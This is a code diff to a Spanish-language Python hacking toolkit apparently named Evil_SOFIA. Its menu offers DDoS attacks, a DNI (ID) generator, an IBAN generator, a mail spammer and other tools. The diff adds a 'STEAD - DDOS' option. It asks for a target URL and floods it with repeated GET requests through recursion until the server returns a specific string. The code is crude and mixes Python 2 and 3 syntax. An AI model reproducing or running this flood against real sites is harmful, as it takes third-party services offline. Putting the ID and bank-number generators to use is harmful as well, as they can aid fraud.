@@ -33,7 +33,7 @@ for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-if vers=="2.5":
+if vers=="3.0":
   print('{>} Good You have last version \n')
 else:
  print("There is New Version available !! Do you Want To Update Your tool ? ")
@@ -54,7 +54,7 @@ else:
    os.system('cls')
   else:
    os.system('clear')
-  os.system('smtp.py')
+  os.system('LSofia.py')
  elif ok=='no':
   pass
 ax = os.system 
@@ -88,12 +88,13 @@ while True:
     print("      .:MENU:.")
     print("   1.EXTRAPOLADOR")
     print("   2.GENERADOR DE DNI")
-    print("   3.ATAQUE DDOS")
+    print("   3.ATAQUE DDOS(LVL 3)")
     print("   4.IBAN GEN/CHECK")
     print("   5.OTRAS HERRMAIENTAS[ALPHA]")
     print("   6.WEB CLEANER")
     print("   7.MAIL SPAMMER")
     print("   8.HOST TO IP")
+    print("   9.STEAD - DDOS (LVL 4")
     print("   99.Salir")
     print("")
     opc = input("  Digite el numero de la opcion: ")
@@ -601,6 +602,37 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
             print '+------------------------------------+'
             #BOG()
         BOG()
+    elif opc==9:
+        print '''
+ SSS  TTTTTT EEEE  AA  DDD  
+S       TT   E    A  A D  D 
+ SSS    TT   EEE  AAAA D  D 
+    S   TT   E    A  A D  D 
+SSSS    TT   EEEE A  A DDD'''
+        try:
+            import requests
+        except:
+            print"Installing requests Module"
+            if os.name=='nt':
+                try:
+                    os.system('C:\Python27\Scripts\pip2.exe install requests')
+                except:
+                    print "Install Python-Pip Sir"
+                    raw_input('')
+                else:
+                    os.system('pip2 install requests')
+
+        import requests
+        inpu = raw_input("URL A ATACAR: ")
+        def function():
+            vers=requests.get(inpu).text.encode('utf-8')
+            if vers=="meisecaca" :
+                print('EL SERVER TIENE PROTECCION CONTRA ESTE DDOS') 
+            else:
+                print("ATACANDOOOOOOOOO UWU")
+                function()
+        function()
+
 
     elif opc==99:
         pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs
